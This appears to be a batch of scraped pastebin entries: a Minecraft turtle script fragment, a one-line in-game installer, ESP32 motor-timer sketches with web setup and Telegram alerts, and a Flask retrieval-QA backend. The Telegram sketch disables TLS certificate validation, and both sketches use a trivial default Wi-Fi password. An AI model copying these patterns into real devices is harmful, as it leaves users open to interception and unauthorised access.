		if not confirmQuadrant(quadrant) then
			validQuadrant = false
		end
	end
	
	local currentDisk = retrieve(""currentDisk"")
	
	if (clearDist < 3) then
		local isItMyName = compareStrings(turtleName, quadrant)
		if (isItMyName == 0) then
			clearSpace(userName)
			return
		end
		if (validQuadrant == false) then
			local isItMyDisk = compareStrings(disk, currentDisk)
			if (isItMyDisk < 2) then
				clearSpace(userName)
				return
			end
		end
		return
	end
	
	if (loadDist < 3) then
		local isItMyName = compareStrings(turtleName, quadrant)
		if (isItMyName == 0) then
			loadSpace(userName, disk, false)
			return
		end
		return
	end
	
	if (moveDist < 3) then
		local isItMyName = compareStrings(turtleName, quadrant)
		if (isItMyName == 0) then
			loadSpace(userName, disk, true)
			return
		end
		local isItMyDisk = compareStrings(disk, currentDisk)
		if (isItMyDisk < 2) then
			clearSpace(userName)
			return
		end
		return
	end
	notifyUser(""Overrun"",{ prefix = retrieve(""turtleName"")})
end

--init:
handleInit()
runChatListener()"
gfzdDHKe,SpatialBotInstaller,Myros27,Lua,Thursday 12th of June 2025 01:26:47 PM CDT,"fs.makeDir(""startup"")
shell.setDir(""startup"")
shell.run(""pastebin get na90MBPy spatialBot"")
os.reboot()"
JHYiyKaG,esp32_24h_timer_ontime_eeprom_gpioreset_universaltelegram,kodilivetv,C++,Thursday 12th of June 2025 01:05:36 PM CDT,"/*
  ESP32 Motor Timer with Web Setup, EEPROM Backup, GPIO Reset, and Telegram Notification

  DESCRIPTION:
  -------------
  This sketch controls a motor (or relay) connected to an ESP32, allowing you to schedule its operation for specific hours each day.
  - Configuration is done via a WiFi Access Point and web interface hosted by the ESP32.
  - All settings (schedule, run time, time) are saved to EEPROM for power-loss recovery.
  - A special reset mode (by connecting GPIO14 to 3.3V and resetting) clears all settings.
  - After each scheduled motor run, a notification is sent to your Telegram account.

  FEATURES:
  ---------
  - Web-based setup: Set current time, motor run time (5–300s), and select operation hours (per hour, 24h grid).
  - Settings backup: All settings are stored in EEPROM and restored after power loss.
  - Reset mode: Connect GPIO14 to 3.3V and reset to clear all settings and re-enter setup.
  - Telegram notification: After each motor run, a message is sent to your Telegram bot.

  WIRING:
  -------
  - MOTOR_PIN: GPIO33 (connect to relay or motor driver)
  - LED_PIN:   GPIO32 (status LED)
  - RESET_PIN: GPIO14 (connect to 3.3V and reset to clear settings)
  - Ensure your relay/motor driver is compatible with 3.3V logic.

  USAGE INSTRUCTIONS:
  -------------------
  1. Power on the ESP32. It will start as a WiFi Access Point (SSID: ESP32-Motor-Timer, Password: 12345678).
  2. Connect to this WiFi network with your phone or computer.
  3. Open a browser and go to the address shown in the Serial Monitor (usually http://192.168.4.1).
  4. Follow the web interface steps:
     - Set the current time (syncs with your device).
     - Set the motor run time (slider, 5–300 seconds).
     - Select the hours you want the motor to run (checkbox grid).
     - When all steps are complete, click ""Start Operation"".
  5. The ESP32 will enter deep sleep and wake up at the scheduled hours to run the motor.
  6. After each run, a Telegram message will be sent (see below for setup).
  7. To reset all settings, connect GPIO14 to 3.3V and reset the ESP32.

  TELEGRAM NOTIFICATION SETUP:
  ----------------------------
  1. Create a Telegram bot using BotFather and get your bot token.
  2. Start a chat with your bot and get your chat ID (see UniversalTelegramBot library examples).
  3. Enter your WiFi credentials, bot token, and chat ID in the placeholders at the top of this sketch.
  4. Install the UniversalTelegramBot and WiFiClientSecure libraries via the Arduino Library Manager.
  5. Ensure your ESP32 can connect to your WiFi for Telegram notifications.

  DEPENDENCIES:
  -------------
  - ESP32 board support (install via Arduino Board Manager)
  - UniversalTelegramBot library
  - WiFiClientSecure library
  - ESP32Time, WiFi, EEPROM libraries (included with ESP32 core)

*/

#include ""soc/soc.h""           // Brownout error fix
#include ""soc/rtc_cntl_reg.h""  // Brownout error fix

#include ""driver/rtc_io.h"" // https://github.com/pycom/esp-idf-2.0/blob/master/components/driver/include/driver/rtc_io.h

#include <ESP32Time.h>
#include <WiFi.h>
#include <EEPROM.h>
#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h>

#define uS_TO_S_FACTOR 1000000ULL
#define DEFAULT_MOTOR_ON_TIME 5
#define MIN_MOTOR_ON_TIME 5
#define MAX_MOTOR_ON_TIME 300
#define MOTOR_PIN 33
#define LED_PIN 32
#define WAKEUP_GPIO GPIO_NUM_14 // Only RTC IO are allowed
#define EEPROM_SIZE 512

// EEPROM Memory Map
#define EEPROM_MAGIC_ADDR 0
#define EEPROM_SCHEDULE_ADDR 4
#define EEPROM_RUNTIME_ADDR 28
#define EEPROM_LAST_SYNC_ADDR 32
#define EEPROM_MAGIC_NUMBER 0xDEADBEEF
#define MAX_TIME_STALENESS 7 * 24 * 3600

const char *ssid = ""ESP32-Motor-Timer"";
const char *password = ""12345678"";

ESP32Time rtc(3600);
WiFiServer server(80);

// RTC memory variables
RTC_DATA_ATTR bool timeWasSet = false;
RTC_DATA_ATTR bool scheduleWasSet = false;
RTC_DATA_ATTR bool runTimeWasSet = false;
RTC_DATA_ATTR int bootCount = 0;
RTC_DATA_ATTR unsigned long webServerStartTime = 0;
RTC_DATA_ATTR bool usingBackupSettings = false;
RTC_DATA_ATTR bool hourlySchedule[24] = {0};
RTC_DATA_ATTR int motorRunTime = DEFAULT_MOTOR_ON_TIME;

// --- Telegram Bot Placeholders ---
const char* TELEGRAM_WIFI_SSID = ""YOUR_WIFI_SSID"";
const char* TELEGRAM_WIFI_PASSWORD = ""YOUR_WIFI_PASSWORD"";
const char* BOT_TOKEN = ""YOUR_BOT_TOKEN"";
const char* CHAT_ID = ""YOUR_CHAT_ID"";

WiFiClientSecure secured_client;
UniversalTelegramBot bot(BOT_TOKEN, secured_client);

struct EEPROMSettings {
  uint32_t magic;
  bool schedule[24];
  int runTime;
  uint32_t lastSyncTime;
};

void setup() {
  Serial.begin(115200);
  delay(1000);
  EEPROM.begin(EEPROM_SIZE);
  
  bootCount++;
  Serial.println(""Boot count: "" + String(bootCount));

  pinMode(MOTOR_PIN, OUTPUT);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(MOTOR_PIN, LOW);

  printWakeupReason();

  // Check if woken up by GPIO14 - clear EEPROM and reset
  if (esp_sleep_get_wakeup_cause() == ESP_SLEEP_WAKEUP_EXT0) {
    Serial.println(""=== GPIO RESET TRIGGERED ==="");
    Serial.println(""Clearing EEPROM settings..."");
    clearEEPROMSettings();
    
    // Reset RTC memory flags
    timeWasSet = false;
    scheduleWasSet = false;
    runTimeWasSet = false;
    usingBackupSettings = false;
    
    Serial.println(""EEPROM cleared - entering setup mode"");
    webServerStartTime = millis();
    setupWebServer();
    return;
  }

  // Normal wakeup logic
  if (timeWasSet && scheduleWasSet && runTimeWasSet && esp_sleep_get_wakeup_cause() == ESP_SLEEP_WAKEUP_TIMER) {
    handleScheduledWakeup();
  } else {
    if (tryLoadBackupSettings()) {
      Serial.println(""=== POWER FAILURE RECOVERY ==="");
      Serial.println(""Loaded backup settings from EEPROM"");
      printCurrentSettings();
      
      timeWasSet = false;
      usingBackupSettings = true;
      
      EEPROMSettings settings;
      loadSettingsFromEEPROM(settings);
      uint32_t currentEpoch = settings.lastSyncTime + (millis() / 1000);
      rtc.setTime(currentEpoch);
      timeWasSet = true;
      
      Serial.println(""Estimated time: "" + rtc.getTime(""%A, %B %d %Y %H:%M:%S""));
      scheduleNextWakeup();
    } else {
      Serial.println(""No backup settings found - entering setup mode"");
      webServerStartTime = millis();
      setupWebServer();
    }
  }
}

void loop() {
  if (!timeWasSet || !scheduleWasSet || !runTimeWasSet) {
    if (millis() - webServerStartTime > 240000) {
      if (tryLoadBackupSettings()) {
        Serial.println(""Timeout reached - falling back to EEPROM settings"");
        usingBackupSettings = true;
        
        EEPROMSettings settings;
        loadSettingsFromEEPROM(settings);
        uint32_t estimatedTime = settings.lastSyncTime + (millis() / 1000);
        rtc.setTime(estimatedTime);
        timeWasSet = true;
        
        scheduleNextWakeup();
      } else {
        Serial.println(""No backup settings - entering 3-hour sleep"");
        setupSleepWakeup();
        esp_deep_sleep_start();
      }
    }
    handleWebClient();
  }
}

void clearEEPROMSettings() {
  // Clear magic number to invalidate settings
  uint32_t clearMagic = 0x00000000;
  EEPROM.put(EEPROM_MAGIC_ADDR, clearMagic);
  EEPROM.commit();
  Serial.println(""EEPROM settings cleared"");
}

bool tryLoadBackupSettings() {
  EEPROMSettings settings;
  if (loadSettingsFromEEPROM(settings)) {
    for (int i = 0; i < 24; i++) {
      hourlySchedule[i] = settings.schedule[i];
    }
    motorRunTime = settings.runTime;
    scheduleWasSet = true;
    runTimeWasSet = true;
    return true;
  }
  return false;
}

bool loadSettingsFromEEPROM(EEPROMSettings &settings) {
  uint32_t magic;
  EEPROM.get(EEPROM_MAGIC_ADDR, magic);
  
  if (magic != EEPROM_MAGIC_NUMBER) {
    Serial.println(""No valid EEPROM settings found"");
    return false;
  }

  EEPROM.get(EEPROM_MAGIC_ADDR, settings.magic);
  for (int i = 0; i < 24; i++) {
    settings.schedule[i] = EEPROM.read(EEPROM_SCHEDULE_ADDR + i);
  }
  EEPROM.get(EEPROM_RUNTIME_ADDR, settings.runTime);
  EEPROM.get(EEPROM_LAST_SYNC_ADDR, settings.lastSyncTime);
  
  if (settings.runTime < MIN_MOTOR_ON_TIME || settings.runTime > MAX_MOTOR_ON_TIME) {
    Serial.println(""Invalid run time in EEPROM: "" + String(settings.runTime));
    return false;
  }
  
  Serial.println(""Valid EEPROM settings loaded"");
  return true;
}

void saveSettingsToEEPROM() {
  Serial.println(""Saving settings to EEPROM..."");
  
  EEPROMSettings settings;
  settings.magic = EEPROM_MAGIC_NUMBER;
  
  for (int i = 0; i < 24; i++) {
    settings.schedule[i] = hourlySchedule[i];
  }
  settings.runTime = motorRunTime;
  settings.lastSyncTime = rtc.getEpoch();
  
  EEPROM.put(EEPROM_MAGIC_ADDR, settings.magic);
  for (int i = 0; i < 24; i++) {
    EEPROM.write(EEPROM_SCHEDULE_ADDR + i, settings.schedule[i]);
  }
  EEPROM.put(EEPROM_RUNTIME_ADDR, settings.runTime);
  EEPROM.put(EEPROM_LAST_SYNC_ADDR, settings.lastSyncTime);
  EEPROM.commit();
  
  Serial.println(""Settings saved to EEPROM successfully"");
  printCurrentSettings();
}

void printCurrentSettings() {
  Serial.println(""Current Settings:"");
  Serial.println(""- Motor run time: "" + String(motorRunTime) + "" seconds"");
  Serial.print(""- Schedule: "");
  
  int count = 0;
  for (int h = 0; h < 24; h++) {
    if (hourlySchedule[h]) {
      if (count > 0) Serial.print("", "");
      Serial.print(String(h < 10 ? ""0"" : """") + String(h) + "":00"");
      count++;
    }
  }
  
  if (count == 0) {
    Serial.println(""No hours scheduled"");
  } else {
    Serial.println("" ("" + String(count) + "" times/day)"");
    Serial.println(""- Total daily runtime: "" + String(count * motorRunTime) + "" seconds"");
  }
}

void handleScheduledWakeup() {
  Serial.println(""\n=== Scheduled Wake-up ==="");
  Serial.println(""Current time: "" + rtc.getTime(""%A, %B %d %Y %H:%M:%S""));
  Serial.println(""Motor run time: "" + String(motorRunTime) + "" seconds"");
  
  if (usingBackupSettings) {
    Serial.println(""Running on backup settings from EEPROM"");
  }

  runMotor();
  scheduleNextWakeup();
}

void runMotor() {
  Serial.println(""Starting motor for "" + String(motorRunTime) + "" seconds..."");

  digitalWrite(LED_PIN, HIGH);
  digitalWrite(MOTOR_PIN, HIGH);

  for (int i = motorRunTime; i > 0; i--) {
    Serial.println(""Motor running... "" + String(i) + ""s remaining"");
    delay(1000);

    int blinkInterval = (motorRunTime < 10) ? 1 : 5;
    if (i % blinkInterval == 0) {
      digitalWrite(LED_PIN, LOW);
      delay(100);
      digitalWrite(LED_PIN, HIGH);
    }
  }

  digitalWrite(MOTOR_PIN, LOW);
  digitalWrite(LED_PIN, LOW);
  Serial.println(""Motor stopped."");

  // --- Send Telegram notification ---
  String msg = ""Motor finished running for "" + String(motorRunTime) + "" seconds at "" + rtc.getTime(""%H:%M:%S %d/%m/%Y"");
  sendTelegramMessage(msg);
}

void setupSleepWakeup() {
  // Setup timer wakeup
  esp_sleep_enable_timer_wakeup(3 * 3600 * uS_TO_S_FACTOR);
  
  // Setup GPIO wakeup for reset functionality
  esp_sleep_enable_ext0_wakeup(WAKEUP_GPIO, 1); // 1 = High trigger
  rtc_gpio_pullup_dis(WAKEUP_GPIO);
  rtc_gpio_pulldown_en(WAKEUP_GPIO);
  Serial.println(""Setup ESP32 to wake up on GPIO14 trigger (reset mode)"");
}

void scheduleNextWakeup() {
  struct tm timeinfo = rtc.getTimeStruct();
  int currentHour = timeinfo.tm_hour;
  int currentMinute = timeinfo.tm_min;

  unsigned long sleepTime = calculateSleepTime(currentHour, currentMinute);

  if (sleepTime > 0) {
    Serial.println(""Next wake-up in "" + String(sleepTime / 3600) + "" hours and "" +
                   String((sleepTime % 3600) / 60) + "" minutes"");

    esp_sleep_enable_timer_wakeup(sleepTime * uS_TO_S_FACTOR);
    
    // Always enable GPIO wakeup for reset functionality
    esp_sleep_enable_ext0_wakeup(WAKEUP_GPIO, 1);
    rtc_gpio_pullup_dis(WAKEUP_GPIO);
    rtc_gpio_pulldown_en(WAKEUP_GPIO);
    
    Serial.println(""Entering deep sleep... (GPIO14 HIGH = reset)"");
    Serial.flush();
    esp_deep_sleep_start();
  } else {
    Serial.println(""No scheduled hours found - entering 24-hour sleep"");
    esp_sleep_enable_timer_wakeup(24 * 3600 * uS_TO_S_FACTOR);
    
    esp_sleep_enable_ext0_wakeup(WAKEUP_GPIO, 1);
    rtc_gpio_pullup_dis(WAKEUP_GPIO);
    rtc_gpio_pulldown_en(WAKEUP_GPIO);
    
    esp_deep_sleep_start();
  }
}

unsigned long calculateSleepTime(int currentHour, int currentMinute) {
  int nextHour = -1;

  for (int h = currentHour + 1; h < 24; h++) {
    if (hourlySchedule[h]) {
      nextHour = h;
      break;
    }
  }

  if (nextHour == -1) {
    for (int h = 0; h < 24; h++) {
      if (hourlySchedule[h]) {
        nextHour = h + 24;
        break;
      }
    }
  }

  if (nextHour == -1) return 0;

  int currentTotalMinutes = currentHour * 60 + currentMinute;
  int nextTotalMinutes = (nextHour % 24) * 60;

  if (nextHour >= 24) {
    nextTotalMinutes += 24 * 60;
  }

  int sleepMinutes = nextTotalMinutes - currentTotalMinutes;
  return sleepMinutes * 60;
}

void setupWebServer() {
  Serial.println(""\n=== Setting up Web Server for Configuration ==="");
  Serial.println(""Connect to WiFi network: "" + String(ssid));
  Serial.println(""Password: "" + String(password));
  Serial.println(""TIMEOUT: 4 minutes"");
  Serial.println(""RESET: Connect GPIO14 to 3.3V and reset ESP32"");

  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  Serial.println(""Web interface: http://"" + IP.toString());
  server.begin();

  for (int i = 0; i < 10; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    digitalWrite(LED_PIN, LOW);
    delay(200);
  }
}

void handleWebClient() {
  WiFiClient client = server.available();

  if (client) {
    Serial.println(""Client connected"");
    String currentLine = """";

    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        if (c == '\n') {
          if (currentLine.length() == 0) {
            sendWebPage(client);
            break;
          } else {
            currentLine = """";
          }
        } else if (c != '\r') {
          currentLine += c;
        }

        if (currentLine.endsWith(""POST /syncTime"")) {
          handleTimeSyncRequest(client);
        } else if (currentLine.endsWith(""POST /setRunTime"")) {
          handleRunTimeRequest(client);
        } else if (currentLine.endsWith(""POST /setSchedule"")) {
          handleScheduleRequest(client);
        }
      }
    }
    client.stop();
  }
}

// Simplified web page (keeping core functionality)
void sendWebPage(WiFiClient &client) {
  unsigned long elapsed = millis() - webServerStartTime;
  unsigned long remaining = (240000 - elapsed) / 1000;

  client.println(""HTTP/1.1 200 OK"");
  client.println(""Content-type:text/html"");
  client.println();
  client.println(""<!DOCTYPE html><html>"");
  client.println(""<head><title>ESP32 Motor Timer Setup</title>"");
  client.println(""<meta name='viewport' content='width=device-width, initial-scale=1'>"");
  client.println(""<style>"");
  client.println(""body{font-family:Arial;text-align:center;padding:20px;background:#f0f0f0;}"");
  client.println("".container{max-width:600px;margin:0 auto;background:white;padding:30px;border-radius:10px;}"");
  client.println(""input,button{padding:10px;margin:5px;font-size:16px;border:1px solid #ddd;border-radius:5px;}"");
  client.println(""button{background:#4CAF50;color:white;border:none;cursor:pointer;padding:15px 30px;}"");
  client.println("".timeout{color:red;font-weight:bold;}"");
  client.println("".step{margin:20px 0;padding:15px;background:#f9f9f9;border-radius:5px;}"");
  client.println("".schedule-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:20px 0;}"");
  client.println("".hour-checkbox{display:flex;align-items:center;padding:8px;background:white;border:1px solid #ddd;border-radius:5px;}"");
  client.println("".reset-info{background:#FFE6E6;padding:10px;border-radius:5px;margin:10px 0;border:1px solid #FF9999;}"");
  client.println(""</style></head>"");
  client.println(""<body>"");
  client.println(""<div class='container'>"");
  client.println(""<h1>ESP32 Motor Timer Setup</h1>"");
  
  client.println(""<div class='reset-info'>"");
  client.println(""<strong>Reset Instructions:</strong><br>"");
  client.println(""To clear settings: Connect GPIO14 to 3.3V and reset ESP32"");
  client.println(""</div>"");
  
  client.println(""<div class='timeout'>Timeout: <span id='countdown'>"" + String(remaining) + ""</span> seconds</div>"");

  // Step 1: Time sync
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 1: Set Current Time</h3>"");
  if (timeWasSet) {
    client.println(""<p>✅ Time set: "" + rtc.getTime(""%H:%M:%S %d/%m/%Y"") + ""</p>"");
  } else {
    client.println(""<h4 id='currentTime'></h4>"");
    client.println(""<form action='/syncTime' method='POST'>"");
    client.println(""<input type='hidden' name='epochTime' id='hiddenEpochTime'>"");
    client.println(""<button type='submit'>Sync Time</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  // Step 2: Motor run time
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 2: Set Motor Run Time</h3>"");
  if (runTimeWasSet) {
    client.println(""<p>✅ Run time set: "" + String(motorRunTime) + "" seconds</p>"");
  } else {
    client.println(""<form action='/setRunTime' method='POST'>"");
    client.println(""<input type='range' name='runTime' min='5' max='300' value='"" + String(motorRunTime) + ""'>"");
    client.println(""<span id='runTimeDisplay'>"" + String(motorRunTime) + ""s</span>"");
    client.println(""<button type='submit'>Set Run Time</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  // Step 3: Schedule
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 3: Select Operation Hours</h3>"");
  if (scheduleWasSet) {
    client.println(""<p>✅ Schedule set!</p>"");
  } else {
    client.println(""<form action='/setSchedule' method='POST'>"");
    client.println(""<div class='schedule-grid'>"");
    for (int h = 0; h < 24; h++) {
      client.println(""<div class='hour-checkbox'>"");
      client.println(""<input type='checkbox' name='hour"" + String(h) + ""' value='1'>"");
      client.println(""<label>"" + String(h < 10 ? ""0"" : """") + String(h) + "":00</label>"");
      client.println(""</div>"");
    }
    client.println(""</div>"");
    client.println(""<button type='submit'>Set Schedule</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  if (timeWasSet && scheduleWasSet && runTimeWasSet) {
    client.println(""<div class='step'>"");
    client.println(""<h3>✅ Setup Complete!</h3>"");
    client.println(""<p>ESP32 will now enter scheduled operation mode.</p>"");
    client.println(""<button onclick='startOperation()'>Start Operation</button>"");
    client.println(""</div>"");
  }

  client.println(""</div>"");

  // Simplified JavaScript
  client.println(""<script>"");
  client.println(""var countdown="" + String(remaining) + "";"");
  client.println(""function updateTime(){"");
  client.println(""var now=new Date();"");
  client.println(""if(document.getElementById('currentTime'))"");
  client.println(""document.getElementById('currentTime').innerHTML='Current Time: '+now.toLocaleString();"");
  client.println(""if(document.getElementById('hiddenEpochTime'))"");
  client.println(""document.getElementById('hiddenEpochTime').value=Math.floor(now.getTime()/1000);"");
  client.println(""}"");
  client.println(""function updateCountdown(){"");
  client.println(""countdown--;document.getElementById('countdown').innerHTML=countdown;"");
  client.println(""}"");
  client.println(""function startOperation(){"");
  client.println(""document.body.innerHTML='<h2>Starting operation...</h2>';"");
  client.println(""}"");
  client.println(""setInterval(updateTime,1000);setInterval(updateCountdown,1000);updateTime();"");
  client.println(""</script></body></html>"");
}

void handleTimeSyncRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  int epochIndex = requestBody.indexOf(""epochTime="");
  if (epochIndex != -1) {
    long epochTime = requestBody.substring(epochIndex + 10).toInt();
    rtc.setTime(epochTime);
    timeWasSet = true;
    Serial.println(""Time synchronized: "" + rtc.getTime(""%A, %B %d %Y %H:%M:%S""));
  }

  client.println(""HTTP/1.1 302 Found"");
  client.println(""Location: /"");
  client.println();
}

void handleRunTimeRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  int runTimeIndex = requestBody.indexOf(""runTime="");
  if (runTimeIndex != -1) {
    int newRunTime = requestBody.substring(runTimeIndex + 8).toInt();
    if (newRunTime >= MIN_MOTOR_ON_TIME && newRunTime <= MAX_MOTOR_ON_TIME) {
      motorRunTime = newRunTime;
      runTimeWasSet = true;
      Serial.println(""Motor run time set to: "" + String(motorRunTime) + "" seconds"");
    }
  }

  client.println(""HTTP/1.1 302 Found"");
  client.println(""Location: /"");
  client.println();
}

void handleScheduleRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  for (int h = 0; h < 24; h++) {
    hourlySchedule[h] = false;
  }

  for (int h = 0; h < 24; h++) {
    String hourParam = ""hour"" + String(h) + ""=1"";
    if (requestBody.indexOf(hourParam) != -1) {
      hourlySchedule[h] = true;
    }
  }

  scheduleWasSet = true;

  // Save to EEPROM when configuration is complete
  if (timeWasSet && scheduleWasSet && runTimeWasSet) {
    saveSettingsToEEPROM();
    delay(2000);
    scheduleNextWakeup();
  }

  client.println(""HTTP/1.1 302 Found"");
  client.println(""Location: /"");
  client.println();
}

void printWakeupReason() {
  esp_sleep_wakeup_cause_t wakeup_reason = esp_sleep_get_wakeup_cause();

  switch (wakeup_reason) {
    case ESP_SLEEP_WAKEUP_TIMER:
      Serial.println(""Wake-up: Scheduled timer"");
      break;
    case ESP_SLEEP_WAKEUP_EXT0:
      Serial.println(""Wake-up: GPIO14 external signal (RESET MODE)"");
      break;
    default:
      Serial.println(""Wake-up: Power on or reset"");
      break;
  }
}

// Helper: Connect to WiFi for Telegram
void connectToWiFiForTelegram() {
  if (WiFi.status() == WL_CONNECTED) return;
  WiFi.mode(WIFI_STA);
  WiFi.begin(TELEGRAM_WIFI_SSID, TELEGRAM_WIFI_PASSWORD);
  unsigned long startAttemptTime = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 15000) {
    delay(500);
  }
}

// Helper: Send Telegram message
void sendTelegramMessage(const String& message) {
  connectToWiFiForTelegram();
  secured_client.setInsecure(); // For ESP32, disables certificate validation
  bot.sendMessage(CHAT_ID, message, """");
}
"
nc77SuTA,Untitled,sandipto729,Python,Thursday 12th of June 2025 12:58:06 PM CDT,"from flask import Flask, request, jsonify
from flask_cors import CORS
from dotenv import load_dotenv
import os

from langchain.prompts import PromptTemplate
from langchain.memory import ConversationBufferWindowMemory
from langchain_community.embeddings import HuggingFaceEmbeddings
from langchain_community.vectorstores import Chroma
from langchain.chains import RetrievalQA
from langchain_groq import ChatGroq



# Load environment
load_dotenv()
groq_api_key = os.getenv(""GROQ_API_KEY"")
FRONTEND_URL = os.getenv(""FRONTEND_URL"")
if not groq_api_key:
    raise ValueError(""GROQ_API_KEY is not set in your .env file."")
os.environ[""GROQ_API_KEY""] = groq_api_key

# Flask setup
app = Flask(__name__)
CORS(app, supports_credentials=True, resources={r""/*"": {""origins"": FRONTEND_URL}})

# Load existing vectorstore (Chroma) from disk
embedding = HuggingFaceEmbeddings(model_name=""sentence-transformers/all-MiniLM-L6-v2"")
vectorstore = Chroma(persist_directory=""./chroma_doc_db"", embedding_function=embedding)

@app.route('/')
def index():
    return ""Backend is running!""

@app.route('/api/process-url', methods=['POST'])
def process_url():
    data = request.json
    query = data.get('query')
    if not query:
        return jsonify({""error"": ""Query is required""}), 400

    try:
        # Initialize LLM
        model = ChatGroq(
            model_name=""llama3-8b-8192"",
            api_key=groq_api_key,
            temperature=0.6,
            max_tokens=512
        )


        # Prompt template
        prompt_template = PromptTemplate(
            input_variables=[""context"", ""question""],
            template=""""""
            You are a helpful assistant that provides concise answers based on the provided documents.

            Context: {context}

            Question: {question}

            Answer:""""""
        )

        # Memory
        memory = ConversationBufferWindowMemory(
            memory_key=""chat_history"",
            return_messages=True,
            k=5,
            output_key=""result""
        )

        # Retriever and QA chain
        retriever = vectorstore.as_retriever(search_kwargs={""k"": 2})
        qa = RetrievalQA.from_chain_type(
            llm=model,
            chain_type=""stuff"",
            retriever=retriever,
            return_source_documents=True,
            memory=memory,
            chain_type_kwargs={""prompt"": prompt_template},
            output_key=""result""
        )

        # Run query
        result = qa({""query"": query})
        
        return jsonify({
            ""answer"": result[""result""],
        })

    except Exception as e:
        return jsonify({""error"": str(e)}), 500

if __name__ == ""__main__"":
    port = int(os.environ.get(""PORT"", 8000))
    app.run(host=""0.0.0.0"", port=port)
"
ehCxcnw6,esp32_timer_ontime_eeprom_gpioreset_24h,kodilivetv,C++,Thursday 12th of June 2025 12:56:43 PM CDT,"/*
   ========================================================================
   ESP32 SCHEDULED MOTOR CONTROL WITH DEEP SLEEP & EEPROM BACKUP
   ========================================================================
   
   OVERVIEW:
   Automatically runs a motor at scheduled hours with deep sleep power saving.
   Survives power failures with EEPROM backup and includes GPIO reset functionality.
   
   HARDWARE REQUIREMENTS:
   • ESP32 development board
   • Motor/relay connected to GPIO33 (MOTOR_PIN)
   • Status LED connected to GPIO32 (LED_PIN) 
   • Reset button: GPIO14 (WAKEUP_GPIO) - connect to 3.3V for reset
   
   FEATURES:
   ✓ Web-based configuration interface (no coding required)
   ✓ Hourly scheduling (select any combination of 24 hours)
   ✓ Adjustable motor run time (5-300 seconds per activation)
   ✓ Ultra-low power deep sleep between activations
   ✓ Automatic time synchronization from web browser
   ✓ EEPROM backup for power failure recovery
   ✓ Hardware reset via GPIO14 to clear all settings
   ✓ Visual feedback with LED status indicators
   
   FIRST TIME SETUP:
   1. Upload this sketch to ESP32
   2. Connect to WiFi network ""ESP32-Motor-Timer"" (password: 12345678)
   3. Open web browser to 192.168.4.1
   4. Follow 3-step setup wizard:
      - Sync current time from your device
      - Set motor run time (5-300 seconds)
      - Select operation hours (checkboxes for each hour 00:00-23:00)
   5. Click ""Start Operation"" - ESP32 enters automatic mode
   
   NORMAL OPERATION:
   • ESP32 sleeps in deep sleep mode (uses <1mA power)
   • Wakes up automatically at scheduled times
   • Runs motor for configured duration
   • LED blinks during motor operation
   • Returns to deep sleep until next scheduled time
   
   POWER FAILURE RECOVERY:
   • Settings automatically saved to EEPROM after first configuration
   • If power is lost, ESP32 recovers settings from EEPROM on restart
   • Time estimation helps resume operation even without WiFi
   • System continues running with last known schedule
   
   MANUAL RESET (Clear All Settings):
   1. Connect GPIO14 to 3.3V (use jumper wire or switch)
   2. Press ESP32 reset button OR power cycle
   3. ESP32 will detect GPIO14 HIGH and clear all EEPROM settings
   4. Automatically enters setup mode for reconfiguration
   5. Disconnect GPIO14 from 3.3V after setup
   
   TROUBLESHOOTING:
   • No WiFi connection? ESP32 creates its own hotspot for setup
   • Setup timeout (4 minutes)? System tries to use EEPROM backup
   • Wrong schedule? Use GPIO14 reset to reconfigure
   • Motor not working? Check GPIO33 connection and power supply
   • LED not blinking? Check GPIO32 connection
   
   TECHNICAL SPECIFICATIONS:
   • Deep sleep power consumption: <1mA
   • Setup timeout: 4 minutes
   • WiFi network: ""ESP32-Motor-Timer""
   • WiFi password: ""12345678""
   • Web interface: 192.168.4.1
   • Motor pin: GPIO33 (active HIGH)
   • LED pin: GPIO32 (active HIGH)
   • Reset pin: GPIO14 (trigger HIGH)
   • EEPROM backup: 512 bytes
   • Time zone: GMT+1 (Portugal)
   • Schedule resolution: 1 hour
   • Run time range: 5-300 seconds
   • Maximum daily activations: 24
   
   WIRING DIAGRAM:
   ESP32 GPIO33 → Motor/Relay IN (or transistor base)
   ESP32 GPIO32 → LED + Resistor → GND
   ESP32 GPIO14 → Reset Switch → 3.3V (normally open)
   ESP32 GND → Motor/LED GND
   ESP32 VIN → External power supply (if needed)
   
   USAGE EXAMPLES:
   • Irrigation system: Water plants 3 times daily for 30 seconds each
   • Feeding system: Dispense food every 4 hours for 10 seconds
   • Ventilation: Run fan for 2 minutes every hour during day
   • Lighting: Turn on grow lights for 15 minutes at specific times
   
   SAFETY NOTES:
   • Motor voltage must match ESP32 output capability (3.3V logic)
   • Use appropriate relay or transistor for high-power motors
   • Ensure adequate power supply for motor and ESP32
   • GPIO14 must be disconnected during normal operation
   • Deep sleep mode saves battery but requires wake-up triggers
   
   VERSION HISTORY:
   v1.0 - Basic timer functionality
   v2.0 - Added EEPROM backup and power failure recovery
   v3.0 - Added GPIO14 hardware reset functionality
   
   ========================================================================
*/
#include ""soc/soc.h""           // Brownout error fix
#include ""soc/rtc_cntl_reg.h""  // Brownout error fix

#include ""driver/rtc_io.h"" // https://github.com/pycom/esp-idf-2.0/blob/master/components/driver/include/driver/rtc_io.h

#include <ESP32Time.h>
#include <WiFi.h>
#include <EEPROM.h>

#define uS_TO_S_FACTOR 1000000ULL
#define DEFAULT_MOTOR_ON_TIME 5
#define MIN_MOTOR_ON_TIME 5
#define MAX_MOTOR_ON_TIME 300
#define MOTOR_PIN 33
#define LED_PIN 32
#define WAKEUP_GPIO GPIO_NUM_14 // Only RTC IO are allowed
#define EEPROM_SIZE 512

// EEPROM Memory Map
